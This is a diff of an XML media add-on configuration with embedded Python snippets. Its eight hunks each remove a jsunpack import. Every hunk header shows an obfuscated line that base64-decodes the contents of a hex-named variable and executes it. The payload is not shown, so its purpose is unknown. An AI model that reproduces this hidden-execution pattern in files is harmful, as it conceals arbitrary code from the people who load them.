@@ -59,7 +59,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <expres><![CDATA[#$pyFunction
 url = '$doregex[multi]'
 $doregex[importar]
-from resolveurl.plugins.lib import jsunpack
+
 $doregex[reparar_conectores]
 
 ]]></expres>
@@ -155,7 +155,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <expres><![CDATA[#$pyFunction
 url = '$doregex[multi]'
 $doregex[importar]
-from resolveurl.plugins.lib import jsunpack
+
 $doregex[reparar_conectores]
 
 ]]></expres>
@@ -251,7 +251,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <expres><![CDATA[#$pyFunction
 url = '$doregex[multi]'
 $doregex[importar]
-from resolveurl.plugins.lib import jsunpack
+
 $doregex[reparar_conectores]
 
 ]]></expres>
@@ -347,7 +347,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <expres><![CDATA[#$pyFunction
 url = '$doregex[multi]'
 $doregex[importar]
-from resolveurl.plugins.lib import jsunpack
+
 $doregex[reparar_conectores]
 
 ]]></expres>
@@ -443,7 +443,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <expres><![CDATA[#$pyFunction
 url = '$doregex[multi]'
 $doregex[importar]
-from resolveurl.plugins.lib import jsunpack
+
 $doregex[reparar_conectores]
 
 ]]></expres>
@@ -540,7 +540,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <expres><![CDATA[#$pyFunction
 url = '$doregex[multi]'
 $doregex[importar]
-from resolveurl.plugins.lib import jsunpack
+
 $doregex[reparar_conectores]
 
 ]]></expres>
@@ -637,7 +637,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <expres><![CDATA[#$pyFunction
 url = '$doregex[multi]'
 $doregex[importar]
-from resolveurl.plugins.lib import jsunpack
+
 $doregex[reparar_conectores]
 
 ]]></expres>
@@ -734,7 +734,7 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <expres><![CDATA[#$pyFunction
 url = '$doregex[multi]'
 $doregex[importar]
-from resolveurl.plugins.lib import jsunpack
+
 $doregex[reparar_conectores]
 
 ]]></expres>
